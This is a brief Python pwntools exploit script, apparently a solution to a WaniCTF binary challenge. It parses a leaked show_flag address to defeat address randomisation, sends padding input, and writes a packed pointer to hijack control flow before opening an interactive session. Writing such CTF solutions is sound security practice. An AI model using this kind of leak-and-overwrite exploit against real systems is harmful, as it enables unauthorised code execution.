#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf

#p = elf.process()
p = elf.debug(gdbscript="b main")
#p = remote("chal-lz56g6.wanictf.org", 9004)

p.readuntil(b"hint: show_flag = ")
leak = int(p.readline().decode(), 16)
elf.address = leak - elf.sym["show_flag"]
log.info(f"elf: 0x{elf.address:x}")

for i in range(3):
    p.sendlineafter(b": ", b"A")
    p.sendlineafter(b": ", b"1.1")
    p.sendlineafter(b": ", b"1.1")

p.sendlineafter(b": ", p64(elf.sym["show_flag"]+0x17))
p.sendlineafter(b": ", b"abc")
p.sendlineafter(b": ", b"efg")

p.interactive()
